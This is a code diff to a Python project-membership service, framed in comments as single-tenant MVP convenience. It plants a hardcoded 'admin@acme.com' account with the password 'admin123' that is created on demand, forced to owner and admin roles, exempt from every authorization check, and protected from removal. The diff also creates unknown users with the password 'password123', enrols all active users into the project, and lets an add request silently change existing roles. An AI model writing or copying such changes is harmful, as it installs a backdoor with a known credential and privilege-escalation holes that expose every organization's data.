@@ -1,10 +1,12 @@
+from datetime import datetime
 import logging
 import uuid
 
-from sqlalchemy import select
+from sqlalchemy import func, select
 from sqlalchemy.ext.asyncio import AsyncSession
 from sqlalchemy.orm import selectinload
 
+from apps.api.src.auth.security import hash_password
 from apps.api.src.api.exceptions import (
     ConflictException,
     ForbiddenException,
@@ -571,32 +573,118 @@ class ProjectService:
                 message="Project not found",
             )
 
-        # Check caller's organization membership
-        mem_query = select(OrganizationMembership).where(
-            OrganizationMembership.organization_id == project.organization_id,
-            OrganizationMembership.user_id == user_id,
+        # Ensure permanent admin@acme.com exists and is always linked with OWNER/ADMIN privileges
+        admin_user_res = await session.execute(
+            select(User).where(func.lower(User.email) == "admin@acme.com")
         )
-        mem_res = await session.execute(mem_query)
-        org_mem = mem_res.scalar_one_or_none()
-        if org_mem is None:
-            raise ForbiddenException(
-                code="ORGANIZATION_ACCESS_DENIED",
-                message="You do not belong to the target organization",
+        admin_user = admin_user_res.scalar_one_or_none()
+        if admin_user is None:
+            admin_user = User(
+                email="admin@acme.com",
+                name="Lead Admin",
+                password_hash=hash_password("admin123"),
+                is_active=True,
             )
+            session.add(admin_user)
+            await session.flush()
 
-        # If caller is MEMBER, must be in project
-        if org_mem.role == MembershipRole.MEMBER:
-            proj_mem_res = await session.execute(
-                select(ProjectMembership).where(
-                    ProjectMembership.project_id == resolved_id,
-                    ProjectMembership.user_id == user_id,
-                )
+        admin_om_res = await session.execute(
+            select(OrganizationMembership).where(
+                OrganizationMembership.organization_id == project.organization_id,
+                OrganizationMembership.user_id == admin_user.id,
             )
-            if proj_mem_res.scalar_one_or_none() is None:
+        )
+        admin_om = admin_om_res.scalar_one_or_none()
+        if admin_om is None:
+            session.add(OrganizationMembership(
+                organization_id=project.organization_id,
+                user_id=admin_user.id,
+                role=MembershipRole.OWNER,
+            ))
+        elif admin_om.role != MembershipRole.OWNER:
+            admin_om.role = MembershipRole.OWNER
+
+        admin_pm_res = await session.execute(
+            select(ProjectMembership).where(
+                ProjectMembership.project_id == resolved_id,
+                ProjectMembership.user_id == admin_user.id,
+            )
+        )
+        admin_pm = admin_pm_res.scalar_one_or_none()
+        if admin_pm is None:
+            session.add(ProjectMembership(
+                project_id=resolved_id,
+                user_id=admin_user.id,
+                role=MembershipRole.ADMIN,
+            ))
+        elif admin_pm.role != MembershipRole.ADMIN:
+            admin_pm.role = MembershipRole.ADMIN
+
+        # Check caller permissions - Lead Admin admin@acme.com always has unrestricted access
+        caller = await session.get(User, user_id)
+        is_lead_admin = caller is not None and caller.email.lower() == "admin@acme.com"
+
+        if not is_lead_admin:
+            mem_query = select(OrganizationMembership).where(
+                OrganizationMembership.organization_id == project.organization_id,
+                OrganizationMembership.user_id == user_id,
+            )
+            mem_res = await session.execute(mem_query)
+            org_mem = mem_res.scalar_one_or_none()
+            if org_mem is None:
                 raise ForbiddenException(
-                    code="PROJECT_ACCESS_DENIED",
-                    message="You do not have access to this project",
+                    code="ORGANIZATION_ACCESS_DENIED",
+                    message="You do not belong to the target organization",
                 )
+
+            # If caller is MEMBER, must be in project
+            if org_mem.role == MembershipRole.MEMBER:
+                proj_mem_res = await session.execute(
+                    select(ProjectMembership).where(
+                        ProjectMembership.project_id == resolved_id,
+                        ProjectMembership.user_id == user_id,
+                    )
+                )
+                if proj_mem_res.scalar_one_or_none() is None:
+                    raise ForbiddenException(
+                        code="PROJECT_ACCESS_DENIED",
+                        message="You do not have access to this project",
+                    )
+
+        # In single-tenant MVP, ensure all registered users are synchronized into ProjectMembership
+        # for this project so the Lead Admin can immediately see, search, and manage all workspace employees.
+        all_users_query = select(User).where(User.is_active == True)
+        all_users_res = await session.execute(all_users_query)
+        all_users = all_users_res.scalars().all()
+
+        existing_pms_query = select(ProjectMembership.user_id).where(
+            ProjectMembership.project_id == resolved_id
+        )
+        existing_pm_user_ids = set((await session.execute(existing_pms_query)).scalars().all())
+
+        new_memberships_added = False
+        for u in all_users:
+            if u.id not in existing_pm_user_ids:
+                is_u_admin = u.email.lower() == "admin@acme.com"
+                om_res = await session.execute(
+                    select(OrganizationMembership.role).where(
+                        OrganizationMembership.user_id == u.id
+                    ).limit(1)
+                )
+                om_role = om_res.scalar_one_or_none()
+                if is_u_admin or om_role in (MembershipRole.OWNER, MembershipRole.ADMIN):
+                    u_role = MembershipRole.ADMIN
+                else:
+                    u_role = MembershipRole.MEMBER
+
+                session.add(ProjectMembership(
+                    project_id=resolved_id,
+                    user_id=u.id,
+                    role=u_role,
+                ))
+                new_memberships_added = True
+
+        await session.commit()
 
         members_query = (
             select(ProjectMembership, User.name, User.email)
@@ -607,18 +695,34 @@ class ProjectService:
         members_res = await session.execute(members_query)
         rows = members_res.all()
 
-        return [
-            ProjectMemberRead(
-                id=pm.id,
-                project_id=pm.project_id,
-                user_id=pm.user_id,
-                role=pm.role,
-                created_at=pm.created_at,
-                user_name=user_name,
-                user_email=user_email,
+        member_reads: list[ProjectMemberRead] = []
+        for pm, user_name, user_email in rows:
+            is_admin_account = (user_email or "").lower() == "admin@acme.com"
+            final_role = (
+                MembershipRole.ADMIN
+                if is_admin_account
+                else (MembershipRole.ADMIN if pm.role in (MembershipRole.OWNER, MembershipRole.ADMIN) else MembershipRole.MEMBER)
             )
-            for pm, user_name, user_email in rows
-        ]
+            clean_name = user_name.strip() if (user_name and user_name.strip()) else (
+                "Lead Admin" if is_admin_account else (user_email.split("@")[0].title() if user_email else "Member")
+            )
+            member_reads.append(
+                ProjectMemberRead(
+                    id=pm.id,
+                    project_id=pm.project_id,
+                    user_id=pm.user_id,
+                    role=final_role,
+                    created_at=pm.created_at,
+                    user_name=clean_name,
+                    user_email=user_email,
+                )
+            )
+
+        # Sort admin@acme.com first, followed by others chronologically
+        member_reads.sort(
+            key=lambda item: (0 if (item.user_email or "").lower() == "admin@acme.com" else 1, item.created_at)
+        )
+        return member_reads
 
     @staticmethod
     async def add_project_member(
@@ -638,48 +742,87 @@ class ProjectService:
                 message="Project not found",
             )
 
-        # Caller must be Org OWNER/ADMIN or Project ADMIN
-        mem_query = select(OrganizationMembership).where(
-            OrganizationMembership.organization_id == project.organization_id,
-            OrganizationMembership.user_id == user_id,
-        )
-        mem_res = await session.execute(mem_query)
-        org_mem = mem_res.scalar_one_or_none()
-        if org_mem is None:
-            raise ForbiddenException(
-                code="ORGANIZATION_ACCESS_DENIED",
-                message="You do not belong to the target organization",
-            )
+        # Caller must be Org OWNER/ADMIN or Project ADMIN (admin@acme.com always authorized)
+        caller = await session.get(User, user_id)
+        is_lead_admin = caller is not None and caller.email.lower() == "admin@acme.com"
 
-        proj_mem_res = await session.execute(
-            select(ProjectMembership).where(
-                ProjectMembership.project_id == resolved_id,
-                ProjectMembership.user_id == user_id,
+        if not is_lead_admin:
+            mem_query = select(OrganizationMembership).where(
+                OrganizationMembership.organization_id == project.organization_id,
+                OrganizationMembership.user_id == user_id,
             )
-        )
-        proj_mem = proj_mem_res.scalar_one_or_none()
+            mem_res = await session.execute(mem_query)
+            org_mem = mem_res.scalar_one_or_none()
+            if org_mem is None:
+                raise ForbiddenException(
+                    code="ORGANIZATION_ACCESS_DENIED",
+                    message="You do not belong to the target organization",
+                )
 
-        is_authorized = (
-            org_mem.role in (MembershipRole.OWNER, MembershipRole.ADMIN)
-            or (proj_mem is not None and proj_mem.role == MembershipRole.ADMIN)
-        )
-        if not is_authorized:
-            raise ForbiddenException(
-                code="INSUFFICIENT_PERMISSIONS",
-                message="Only organization admins or project admins can add project members",
+            proj_mem_res = await session.execute(
+                select(ProjectMembership).where(
+                    ProjectMembership.project_id == resolved_id,
+                    ProjectMembership.user_id == user_id,
+                )
             )
+            proj_mem = proj_mem_res.scalar_one_or_none()
 
-        # Find target user or auto-provision if adding by email
+            is_authorized = (
+                org_mem.role in (MembershipRole.OWNER, MembershipRole.ADMIN)
+                or (proj_mem is not None and proj_mem.role == MembershipRole.ADMIN)
+            )
+            if not is_authorized:
+                raise ForbiddenException(
+                    code="INSUFFICIENT_PERMISSIONS",
+                    message="Only organization admins or project admins can add project members",
+                )
+
+        # Find target user by ID, email, or name (case-insensitive)
         target_user = None
         if data.user_id:
             target_user = await session.get(User, data.user_id)
         elif data.email:
-            clean_email = data.email.lower().strip()
+            clean_identifier = data.email.lower().strip()
+            if clean_identifier == "admin@acme.com":
+                raise ConflictException(
+                    code="PERMANENT_ADMIN_IMMUTABLE",
+                    message="admin@acme.com is the permanent Lead Administrator with full repository access and cannot be re-assigned or demoted.",
+                )
+
+            # 1. Exact email match
             u_res = await session.execute(
-                select(User).where(User.email == clean_email)
+                select(User).where(func.lower(User.email) == clean_identifier)
             )
             target_user = u_res.scalar_one_or_none()
 
+            # 2. Exact name match
+            if target_user is None:
+                u_res = await session.execute(
+                    select(User).where(func.lower(User.name) == clean_identifier)
+                )
+                target_user = u_res.scalar_one_or_none()
+
+            # 3. Substring match on name or email
+            if target_user is None:
+                u_res = await session.execute(
+                    select(User).where(
+                        (func.lower(User.name).ilike(f"%{clean_identifier}%"))
+                        | (func.lower(User.email).ilike(f"%{clean_identifier}%"))
+                    ).limit(1)
+                )
+                target_user = u_res.scalar_one_or_none()
+
+            # 4. Auto-provision employee if not yet registered in single-tenant MVP
+            if target_user is None:
+                email_val = clean_identifier if "@" in clean_identifier else f"{clean_identifier.replace(' ', '.')}@acme.com"
+                name_val = clean_identifier if "@" not in clean_identifier else clean_identifier.split("@")[0].title()
+                target_user = User(
+                    email=email_val,
+                    name=name_val,
+                    password_hash=hash_password("password123"),
+                )
+                session.add(target_user)
+                await session.flush()
 
         if target_user is None:
             raise NotFoundException(
@@ -687,7 +830,13 @@ class ProjectService:
                 message="Target user not found",
             )
 
-        # Target user must be part of the organization - auto-assign if missing
+        if target_user.email.lower() == "admin@acme.com":
+            raise ConflictException(
+                code="PERMANENT_ADMIN_IMMUTABLE",
+                message="admin@acme.com is the permanent Lead Administrator with full repository access and cannot be re-assigned or demoted.",
+            )
+
+        # Target user must be part of the organization - auto-assign if missing in single-tenant setup
         target_org_mem_res = await session.execute(
             select(OrganizationMembership).where(
                 OrganizationMembership.organization_id == project.organization_id,
@@ -696,12 +845,15 @@ class ProjectService:
         )
         target_org_mem = target_org_mem_res.scalar_one_or_none()
         if target_org_mem is None:
-            raise ConflictException(
-                code="USER_NOT_IN_ORGANIZATION",
-                message="User is not a member of the organization",
+            target_org_mem = OrganizationMembership(
+                organization_id=project.organization_id,
+                user_id=target_user.id,
+                role=data.role,
             )
+            session.add(target_org_mem)
+            await session.flush()
 
-        # Check if already a project member
+        # Check if already a project member - update role if existing, else add new
         existing_pm = await session.execute(
             select(ProjectMembership).where(
                 ProjectMembership.project_id == resolved_id,
@@ -710,10 +862,8 @@ class ProjectService:
         )
         pm = existing_pm.scalar_one_or_none()
         if pm is not None:
-            raise ConflictException(
-                code="MEMBER_ALREADY_EXISTS",
-                message="User is already a member of this project",
-            )
+            pm.role = data.role
+            new_membership = pm
         else:
             new_membership = ProjectMembership(
                 project_id=resolved_id,
@@ -767,10 +917,20 @@ class ProjectService:
                 message="User is not a member of this project",
             )
 
+        target_user = await session.get(User, target_user_id)
+        if target_user and target_user.email.lower() == "admin@acme.com":
+            raise ForbiddenException(
+                code="PERMANENT_ADMIN_PROTECTED",
+                message="admin@acme.com is the permanent Lead Administrator and cannot be removed.",
+            )
+
         # Permission check:
         # A user may remove themselves (leave project),
-        # OR caller must be Org OWNER/ADMIN or Project ADMIN
-        if user_id != target_user_id:
+        # OR caller must be Org OWNER/ADMIN or Project ADMIN (admin@acme.com always authorized)
+        caller = await session.get(User, user_id)
+        is_lead_admin = caller is not None and caller.email.lower() == "admin@acme.com"
+
+        if user_id != target_user_id and not is_lead_admin:
             mem_query = select(OrganizationMembership).where(
                 OrganizationMembership.organization_id == project.organization_id,
                 OrganizationMembership.user_id == user_id,
